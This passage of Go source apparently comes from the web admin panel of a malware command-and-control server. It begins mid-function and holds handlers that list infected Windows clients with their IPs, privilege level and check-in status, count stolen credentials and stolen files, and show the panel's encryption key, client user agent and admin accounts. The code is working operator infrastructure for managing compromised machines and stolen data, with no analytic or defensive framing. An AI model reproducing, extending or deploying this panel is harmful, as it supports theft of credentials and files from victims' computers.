		//strings.ReplaceAll(clean, ":")
		///var cleanedData string
		//scanner := bufio.NewScanner(strings.NewReader(base64Decode(rawInfo)))
		//for scanner.Scan() {
		//	fmt.Println(scanner.Text())
		//}

		data.ClientInfo = base64Decode(rawInfo)

		parsedTemplate, _ := template.ParseFiles("static/manage_windows.html")
		Err := parsedTemplate.Execute(w, data)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	} else {
		login := LoginPage{"window.onload = alertFunction;", "warning", "You are not logged in!"}
		parsedTemplate, _ := template.ParseFiles("static/login.html")
		Err := parsedTemplate.Execute(w, login)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	}
}

func clientsWindowsHandle(w http.ResponseWriter, r *http.Request) {
	Username := getUserName(r)
	if Username != "" {
		var UID, ClientVersion, IP, FLAG, OS, ABList, AB, LR, cLR string
		data := ClientsPage{}

		data.Name = Name

		data.TotalClients = strconv.Itoa(TotalClients)
		data.ActiveClients = strconv.Itoa(ActiveClients)
		data.Username = Username
		data.StolenCredentials = strconv.Itoa(StolenCredentials)
		data.StolenFiles = strconv.Itoa(StolenFiles)
		data.ServerPort = serverPort

		rows, _ := DB.Query("SELECT UID, ClientVersion, IP, Flag, OperatingSystem, Abilities, LastResponse FROM windows_clients")
		for rows.Next() {
			_ = rows.Scan(&UID, &ClientVersion, &IP, &FLAG, &OS, &ABList, &LR)
			if strings.Contains(ABList, "true") {
				AB = ` <i class="fas fa-crown"></i> `
			}
			if strings.Contains(ABList, "false") {
				AB = ` <i class="fas fa-user"></i> `
			}

			i, _ := strconv.ParseFloat(Timeout, 32)

			then, _ := time.Parse(time.RFC822Z, LR)
			duration := time.Since(then)
			if duration.Minutes() <= i {
				cLR = `<span style="color: #00ff00;">` + LR + `</span>`
			} else {
				cLR = `<span style="color: #ff0000;">` + LR + `</span>`
			}
			table := ClientsTable{FLAG, IP, UID, ClientVersion, OS, template.HTML(AB), template.HTML(cLR)}
			data.ClientTables = append(data.ClientTables, table)
		}

		parsedTemplate, _ := template.ParseFiles("static/windows_clients.html")
		Err := parsedTemplate.Execute(w, data)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	} else {
		login := LoginPage{"window.onload = alertFunction;", "warning", "You are not logged in!"}
		parsedTemplate, _ := template.ParseFiles("static/login.html")
		Err := parsedTemplate.Execute(w, login)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	}
}

func settingsHandle(w http.ResponseWriter, r *http.Request) {
	Username := getUserName(r)
	if Username != "" {
		var UID, User, LastSeen string
		data := SettingsPage{}

		data.Name = Name
		data.EncKey = EncryptionPassword
		data.UserAgent = UserAgent
		data.Username = Username
		data.CurrentTimeout = GetSpecificSQL("settings", "Value", "Name", "ActiveClient")
		rows, _ := DB.Query("SELECT UID, Username, LastLogin FROM admins")
		for rows.Next() {
			_ = rows.Scan(&UID, &User, &LastSeen)
			table := SettingsAdminTable{UID, User, LastSeen}
			data.AdminsTable = append(data.AdminsTable, table)
		}

		parsedTemplate, _ := template.ParseFiles("static/settings.html")
		Err := parsedTemplate.Execute(w, data)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	} else {
		login := LoginPage{"window.onload = alertFunction;", "warning", "You are not logged in!"}
		parsedTemplate, _ := template.ParseFiles("static/login.html")
		Err := parsedTemplate.Execute(w, login)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	}
}

func notFound(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, "static/404.html")
}
func faviconHandle(response http.ResponseWriter, request *http.Request) {
	http.ServeFile(response, request, "static/images/favicon.ico")
}
